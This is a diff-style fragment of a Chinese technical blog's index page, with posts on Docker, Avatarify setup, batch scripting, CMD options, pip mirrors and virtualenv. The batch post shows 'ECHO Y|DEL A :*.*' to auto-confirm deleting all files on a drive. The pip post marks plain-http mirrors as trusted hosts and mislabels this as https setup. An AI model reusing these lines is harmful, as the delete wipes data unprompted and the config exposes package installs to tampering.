   Save one or more images to a tar archive (streamed to STDOUT by default)</span><br><span class="line">  search      Search the Docker Hub for images</span><br><span class="line">  start       Start one or more stopped containers</span><br><span class="line">  stats       Display a live stream of container(s) resource usage statistics</span><br><span class="line">  stop        Stop one or more running containers</span><br><span class="line">  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE</span><br><span class="line">  top         Display the running processes of a container</span><br><span class="line">  unpause     Unpause all processes within one or more containers</span><br><span class="line">  update      Update configuration of one or more containers</span><br><span class="line">  version     Show the Docker version information</span><br><span class="line">  wait        Block until one or more containers stop, then print their exit codes</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-<h1 id="运行已有的容器"><a href="#运行已有的容器" class="headerlink" title="运行已有的容器"></a>运行已有的容器</h1><p>查看已有的容器列表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker ps -a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-16-docker/image-20201016100910621.png" alt="image-20201016100910621"></p>
-<p>运行已有容器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker start b4f5d4ab673e </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-16-docker/image-20201016101233861.png" alt="image-20201016101233861"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/16/docker/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Avatarify的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/29/Avatarify%E7%9A%84%E4%BD%BF%E7%94%A8/">Avatarify的使用-windows</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/29/Avatarify%E7%9A%84%E4%BD%BF%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2020-09-29T09:07:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="拖网络权重"><a href="#拖网络权重" class="headerlink" title="拖网络权重"></a>拖网络权重</h2><p><a target="_blank" rel="noopener" href="https://openavatarify.s3.amazonaws.com/weights/vox-adv-cpk.pth.tar">here</a>，<a target="_blank" rel="noopener" href="https://yadi.sk/d/M0FWpz2ExBfgAA">here</a>，or <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1coUCdyRXDbpWnEkA99NLNY60mb9dQ_n3/view?usp=sharing">here</a>将文件放在目录中（不要解压缩）</p>
-<p>MD5:  <code>8a45a24037871c045fbb8a6a8aa95ebc</code></p>
-<h2 id="下载Miniconda"><a href="#下载Miniconda" class="headerlink" title="下载Miniconda"></a>下载Miniconda</h2><p><a target="_blank" rel="noopener" href="https://repo.anaconda.com/miniconda/Miniconda3-latest-Windows-x86_64.exe">Miniconda python3.X</a></p>
-<h2 id="拖项目"><a href="#拖项目" class="headerlink" title="拖项目"></a>拖项目</h2><p><a target="_blank" rel="noopener" href="https://github.com/alievk/avatarify">avatarify</a></p>
-<p>下载安装命令</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/alievk/avatarify.git</span><br><span class="line"><span class="built_in">cd</span> avatarify</span><br><span class="line">scripts\install_windows.bat</span><br></pre></td></tr></table></figure>
-
-<p>完成后，不要关闭命令行</p>
-<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run_windows.bat</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装OBS"><a href="#安装OBS" class="headerlink" title="安装OBS"></a>安装OBS</h2><p><a target="_blank" rel="noopener" href="https://obsproject.com/">OBS 工作室</a></p>
-<h2 id="安装虚拟摄像头插件"><a href="#安装虚拟摄像头插件" class="headerlink" title="安装虚拟摄像头插件"></a>安装虚拟摄像头插件</h2><p><a target="_blank" rel="noopener" href="https://obsproject.com/forum/resources/obs-virtualcam.949/">虚拟摄像头插件</a></p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>运行OBS工作室</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">奇奇怪怪的工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/29/Avatarify%E7%9A%84%E4%BD%BF%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bat脚本撰写" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/15/bat%E8%84%9A%E6%9C%AC%E6%92%B0%E5%86%99/">bat脚本撰写</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/15/bat%E8%84%9A%E6%9C%AC%E6%92%B0%E5%86%99/" class="archive-article-date">
-  	<time datetime="2020-09-15T06:18:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>批处理定义：顾名思义，批处理文件是将一系列命令按一定的顺序集合为一个可执行的文本文件，其扩展名为BAT或者CMD。这些命令统称批处理命令。</p>
-<p>在批处理过程中，可以通过Ctrl+C来结束执行过程</p>
-<h1 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h1><h2 id="REM和"><a href="#REM和" class="headerlink" title="REM和::"></a>REM和::</h2><p>REM为注释命令，一般用来给程序加上注解，该命令后的内容不被执行，但能回显。<br>其次, :: 也可以起到rem 的注释作用, 而且更简洁有效; 但有两点需要注意：</p>
-<p>第一, 任何以冒号:开头的字符行, 在批处理中都被视作标号, 而直接忽略其后的所有内容。<br>有效标号：冒号后紧跟一个以字母数字开头的字符串，goto语句可以识别。<br>无效标号：冒号后紧跟一个非字母数字的一个特殊符号，goto无法识别的标号，可以起到注释作用，所以 :: 常被用作注释符号，其实 :+ 也可起注释作用。</p>
-<p>第 二, 与rem 不同的是, ::后的字符行在执行时不会回显, 无论是否用echo on打开命令行回显状态, 因为命令解释器不认为他是一个有效的命令行, 就此点来看, rem 在某些场合下将比 :: 更为适用; 另外, rem 可以用于 config.sys 文件中。</p>
-<p>行内注释格式：%注释内容% （不常用，慎用）</p>
-<h2 id="ECHO-和"><a href="#ECHO-和" class="headerlink" title="ECHO 和@"></a>ECHO 和@</h2><p>@字符放在命令前将关闭该命令回显，无论此时echo是否为打开状态。</p>
-<p>echo命令的作用列举如下：<br>（1）打开回显或关闭回显功能<br>格式:echo [{ on|off }]<br>如果想关闭“ECHO OFF”命令行自身的显示，则需要在该命令行前加上“@”。</p>
-<p>（2）显示当前ECHO设置状态<br>格式:echo</p>
-<p>（3）输出提示信息<br>格式：ECHO 信息内容<br>上述是ECHO命令常见的三种用法，也是大家熟悉和会用的，但作为DOS命令淘金者你还应该知道下面的技巧：</p>
-<p>（4）关闭DOS命令提示符<br>在DOS提示符状态下键入ECHO OFF，能够关闭DOS提示符的显示使屏幕只留下光标，直至键入ECHO ON，提示符才会重新出现。</p>
-<p>（5）输出空行，即相当于输入一个回车<br>格式：ECHO．<br>值得注意的是命令行中的“．”要紧跟在ECHO后面中间不能有空格，否则“．”将被当作提示信息输出到屏幕。另外“．”可以用，：；”／[]＋等任一符号替代。<br>命令ECHO．输出的回车，经DOS管道转向可以作为其它命令的输入，比如echo.|time即相当于在TIME命令执行后给出一个回车。所以执行时系统会在显示当前时间后，自动返回到DOS提示符状态</p>
-<p>（6）答复命令中的提问<br>格式：ECHO 答复语|命令文件名<br>上述格式可以用于简化一些需要人机对话的命令（如：CHKDSK／F；FORMAT Drive:；del <em>.<em>）的操作，它是通过DOS管道命令把ECHO命令输出的预置答复语作为人机对话命令的输入。下面的例子就相当于在调用的命令出现人机对话时输入“Y”回车：<br>C:&gt;ECHO Y|CHKDSK/F<br>C:&gt;ECHO Y|DEL A :</em>.</em></p>
-<p>（7）建立新文件或增加文件内容<br>格式：ECHO 文件内容&gt;文件名<br>ECHO 文件内容&gt;&gt;文件名</p>
-<p>例如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:&gt;ECHO @ECHO OFF&gt;AUTOEXEC.BAT                       建立自动批处理文件</span><br><span class="line">&gt; C:&gt;ECHO C:\CPAV\BOOTSAFE&gt;&gt;AUTOEXEC.BAT               向自动批处理文件中追加内容</span><br><span class="line">&gt; C:&gt;TYPE AUTOEXEC.BAT                                 显示该自动批处理文件</span><br><span class="line">&gt; @ECHO OFF</span><br><span class="line">&gt; C:\CPAV\BOOTSAFE</span><br></pre></td></tr></table></figure>
-
-<p>（8）向打印机输出打印内容或打印控制码<br>格式：ECHO 打印机控制码&gt;;PRN<br>ECHO 打印内容&gt;;PRN</p>
-<p>下面的例子是向M－1724打印机输入打印控制码。＜Alt＞156是按住Alt键在小键盘键入156，类似情况依此类推：</p>
-<p>C:&gt;ECHO +156+42+116&gt;;PRN（输入下划线命令FS＊t）<br>C:&gt;ECHO [email=+155@]+155@&gt;;PRN[/email]（输入初始化命令ESC@）<br>C:&gt;ECHO.&gt;;PRN（换行）<br>（9）使喇叭鸣响<br>C:&gt;ECHO ^G<br>“^G”是在dos窗口中用Ctrl＋G或Alt＋007输入，输入多个^G可以产生多声鸣响。使用方法是直接将其加入批处理文件中或做成批处理文件调用。<br>这里的“^G”属于特殊符号的使用</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">BAT</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/15/bat%E8%84%9A%E6%9C%AC%E6%92%B0%E5%86%99/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CMD命令" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/15/CMD%E5%91%BD%E4%BB%A4/">CMD命令</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/15/CMD%E5%91%BD%E4%BB%A4/" class="archive-article-date">
-  	<time datetime="2020-09-15T05:03:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CMD命令"><a href="#CMD命令" class="headerlink" title="CMD命令"></a>CMD命令</h1><p>启动 Windows 命令解释器的一个新实例</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">CMD [/A | /U] [/Q] [/D] [/E:ON | /E:OFF] [/F:ON | /F:OFF] [/V:ON | /V:OFF]</span><br><span class="line">    [[/S] [/C | /K] string]</span><br><span class="line"></span><br><span class="line">/C      执行字符串指定的命令然后终止</span><br><span class="line">/K      执行字符串指定的命令但保留</span><br><span class="line">/S      修改 /C 或 /K 之后的字符串处理(见下)</span><br><span class="line">/Q      关闭回显</span><br><span class="line">/D      禁止从注册表执行 AutoRun 命令(见下)</span><br><span class="line">/A      使向管道或文件的内部命令输出成为 ANSI</span><br><span class="line">/U      使向管道或文件的内部命令输出成为</span><br><span class="line">        Unicode</span><br><span class="line">/T:fg   设置前台/背景颜色(详细信息见 COLOR /?)</span><br><span class="line">/E:ON   启用命令扩展(见下)</span><br><span class="line">/E:OFF  禁用命令扩展(见下)</span><br><span class="line">/F:ON   启用文件和目录名完成字符(见下)</span><br><span class="line">/F:OFF  禁用文件和目录名完成字符(见下)</span><br><span class="line">/V:ON   使用 ! 作为分隔符启用延迟的环境变量</span><br><span class="line">        扩展。例如，/V:ON 会允许 !var! 在执行时</span><br><span class="line">        扩展变量 var。var 语法会在输入时</span><br><span class="line">        扩展变量，这与在一个 FOR</span><br><span class="line">        循环内不同。</span><br><span class="line">/V:OFF  禁用延迟的环境扩展。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>注意，如果字符串加有引号，可以接受用命令分隔符 “&amp;&amp;”分隔多个命令。另外，由于兼容性原因，/X 与 /E:ON 相同，/Y 与 /E:OFF 相同，且 /R 与/C 相同。任何其他开关都将被忽略。如果指定了 /C 或 /K，则会将该开关之后的命令行的剩余部分作为一个命令行处理，其中，会使用下列逻辑处理引号(“)字符:</p>
-<pre><code>1.  如果符合下列所有条件，则会保留
-    命令行上的引号字符:
-
-    - 不带 /S 开关
-    - 正好两个引号字符
-    - 在两个引号字符之间无任何特殊字符，
-      特殊字符指下列字符: &amp;&lt;&gt;()@^|
-    - 在两个引号字符之间至少有
-      一个空格字符
-    - 在两个引号字符之间的字符串是某个
-      可执行文件的名称。
-
-2.  否则，老办法是看第一个字符
-    是否是引号字符，如果是，则去掉首字符并
-    删除命令行上最后一个引号，保留
-    最后一个引号之后的所有文本。</code></pre>
-<p>如果 /D 未在命令行上被指定，当 CMD.EXE 开始时，它会寻找以下 REG_SZ/REG_EXPAND_SZ 注册表变量。如果其中一个或两个都存在，这两个变量会先被执行。</p>
-<pre><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun
-
-    和/或
-
-HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun</code></pre>
-<p>命令扩展是按默认值启用的。你也可以使用 /E:OFF ，为某一特定调用而停用扩展。你可以在机器上和/或用户登录会话上启用或停用 CMD.EXE 所有调用的扩展，这要通过设置使用REGEDIT.EXE 的注册表中的一个或两个 REG_DWORD 值:</p>
-<pre><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\EnableExtensions
-
-    和/或
-
-HKEY_CURRENT_USER\Software\Microsoft\Command Processor\EnableExtensions</code></pre>
-<p>到 0x1 或 0x0。用户特定设置比机器设置有优先权。命令行开关比注册表设置有优先权。</p>
-<p>在批处理文件中，SETLOCAL ENABLEEXTENSIONS 或 DISABLEEXTENSIONS 参数比 /E:ON 或 /E:OFF 开关有优先权。请参阅 SETLOCAL /? 获取详细信息。命令扩展包括对下列命令所做的更改和/或添加:</p>
-<pre><code>DEL or ERASE
-COLOR
-CD or CHDIR
-MD or MKDIR
-PROMPT
-PUSHD
-POPD
-SET
-SETLOCAL
-ENDLOCAL
-IF
-FOR
-CALL
-SHIFT
-GOTO
-START (同时包括对外部命令调用所做的更改)
-ASSOC
-FTYPE</code></pre>
-<p>有关特定详细信息，请键入 commandname /? 查看。</p>
-<p>延迟环境变量扩展不按默认值启用。你可以用/V:ON 或 /V:OFF 开关，为 CMD.EXE 的某个调用而启用或停用延迟环境变量扩展。你可以在机器上和/或用户登录会话上启用或停用 CMD.EXE 所有调用的延迟扩展，这要通过设置使用 REGEDIT.EXE 的注册表中的一个或两个 REG_DWORD 值:</p>
-<pre><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\DelayedExpansion
-
-    和/或
-
-HKEY_CURRENT_USER\Software\Microsoft\Command Processor\DelayedExpansion</code></pre>
-<p>到 0x1 或 0x0。用户特定设置比机器设置有优先权。命令行开关比注册表设置有优先权。</p>
-<p>在批处理文件中，SETLOCAL ENABLEDELAYEDEXPANSION 或 DISABLEDELAYEDEXPANSION参数比 /V:ON 或 /V:OFF 开关有优先权。请参阅 SETLOCAL /? 获取详细信息。</p>
-<p>如果延迟环境变量扩展被启用，惊叹号字符可在执行时间被用来代替一个环境变量的数值。</p>
-<p>你可以用 /F:ON 或 /F:OFF 开关为 CMD.EXE 的某个调用而启用或禁用文件名完成。你可以在计算上和/或用户登录会话上启用或禁用 CMD.EXE 所有调用的完成，这可以通过使用 REGEDIT.EXE 设置注册表中的下列 REG_DWORD 的全部或其中之一:</p>
-<pre><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\CompletionChar
-HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\PathCompletionChar
-
-    和/或
-
-HKEY_CURRENT_USER\Software\Microsoft\Command Processor\CompletionChar
-HKEY_CURRENT_USER\Software\Microsoft\Command Processor\PathCompletionChar</code></pre>
-<p>由一个控制字符的十六进制值作为一个特定参数(例如，0x4是Ctrl-D，0x6 是 Ctrl-F)。用户特定设置优先于机器设置。命令行开关优先于注册表设置。如果完成是用 /F:ON 开关启用的，两个要使用的控制符是: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目录名完成用 Ctrl-D，文件名完成用 Ctrl-F。</span><br></pre></td></tr></table></figure>
-
-<p>要停用注册表中的某个字符，请用空格(0x20)的数值，因为此字符不是控制字符。</p>
-<p>如果键入两个控制字符中的一个，完成会被调用。完成功能将路径字符串带到光标的左边，如果没有通配符，将通配符附加到左边，并建立相符的路径列表。然后，显示第一个相符的路径。如果没有相符的路径，则发出嘟嘟声，不影响显示。之后，重复按同一个控制字符会循环显示相符路径的列表。将 Shift 键跟控制字符同时按下，会倒着显示列表。如果对该行进行了任何编辑，并再次按下控制字符，保存的相符路径的列表会被丢弃，新的会被生成。如果在文件和目录名完成之间切换，会发生同样现象。两个控制字符之间的唯一区别是文件完成字符符合文件和目录名，而目录完成字符只符合目录名。如果文件完成被用于内置式目录命令(CD、MD 或 RD)，就会使用目录完成。用引号将相符路径括起来，完成代码可以正确处理含有空格或其他特殊字符的文件名。同时，如果备份，然后从行内调用文件完成，完成被调用时位于光标右方的文字会被调用。</p>
-<p>需要引号的特殊字符是:<br>     <space><br>     ()[]{}^=;!’+,`~(&amp;()</space></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CMD</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Windows</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/15/CMD%E5%91%BD%E4%BB%A4/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-python-镜像源配置" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/15/python-%E9%95%9C%E5%83%8F%E6%BA%90%E9%85%8D%E7%BD%AE/">python-镜像源配置</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/15/python-%E9%95%9C%E5%83%8F%E6%BA%90%E9%85%8D%E7%BD%AE/" class="archive-article-date">
-  	<time datetime="2020-09-15T03:40:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="国内镜像源"><a href="#国内镜像源" class="headerlink" title="国内镜像源"></a>国内镜像源</h2><p>清华：<a target="_blank" rel="noopener" href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
-<p>阿里云：<a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
-<p>中国科技大学 <a target="_blank" rel="noopener" href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a></p>
-<p>华中理工大学：<a target="_blank" rel="noopener" href="http://pypi.hustunique.com/">http://pypi.hustunique.com/</a></p>
-<p>山东理工大学：<a target="_blank" rel="noopener" href="http://pypi.sdutlinux.org/">http://pypi.sdutlinux.org/</a> </p>
-<p>豆瓣：<a target="_blank" rel="noopener" href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
-<h2 id="临时使用"><a href="#临时使用" class="headerlink" title="临时使用"></a>临时使用</h2><p> 在使用pip的时候加参数-i <a target="_blank" rel="noopener" href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a><br>例如：pip install -i <a target="_blank" rel="noopener" href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a> pyspider，这样就会从清华这边的镜像去安装pyspider库。</p>
-<h2 id="长久更改"><a href="#长久更改" class="headerlink" title="长久更改"></a>长久更改</h2><p> Linux下，修改 ~/.pip/pip.conf (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹)</p>
-<p>内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 8</span><br><span class="line">index-url &#x3D;  http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">extra-index-url&#x3D; http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line">[install]</span><br><span class="line">trusted-host&#x3D;</span><br><span class="line">    mirrors.aliyun.com</span><br><span class="line">    pypi.douban.com</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>a、此为设置pip的配置文件；</p>
-<p>b、第2行是设置超时时间，单位秒；</p>
-<p>c、第3行是指定优先下载源，第4行是备用下载源；</p>
-<p>d、6~8行内容是配置可能需要使用https方式通信。</p>
-</blockquote>
-<p>windows下，直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini。内容同上。</p>
-<p>本机win10操作系统，目录：C:\Users\DELL\AppData\Roaming\pip\pip.ini</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/15/python-%E9%95%9C%E5%83%8F%E6%BA%90%E9%85%8D%E7%BD%AE/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-python-虚拟环境" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/15/python-%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/">python-虚拟环境</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/15/python-%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/" class="archive-article-date">
-  	<time datetime="2020-09-15T03:32:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="python-虚拟环境-virtualenv的使用"><a href="#python-虚拟环境-virtualenv的使用" class="headerlink" title="python-虚拟环境-virtualenv的使用"></a>python-虚拟环境-virtualenv的使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install virtualenv</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="虚拟环境创建"><a href="#虚拟环境创建" class="headerlink" title="虚拟环境创建"></a>虚拟环境创建</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python -m virtualenv ENV          #创建一个虚拟环境，虚拟环境的名字为ENV</span><br><span class="line">python -n venv ENV                #这个语句同等效力</span><br></pre></td></tr></table></figure>
-
-<h2 id="虚拟环境启动"><a href="#虚拟环境启动" class="headerlink" title="虚拟环境启动"></a>虚拟环境启动</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV\Scripts\activate             #windows下</span><br><span class="line">ENV/bin/activate               #linux下</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-python-%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/image-20200915125130838.png" alt="image-20200915125130838"></p>
-<p>括号内为虚拟环境名称</p>
-<p>之后可以按正常CMD命令进行工作</p>
-<p>相当于临时修改了操作系统的变量，将python命令重定向到虚拟环境内</p>
-<h2 id="虚拟环境退出"><a href="#虚拟环境退出" class="headerlink" title="虚拟环境退出"></a>虚拟环境退出</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
-
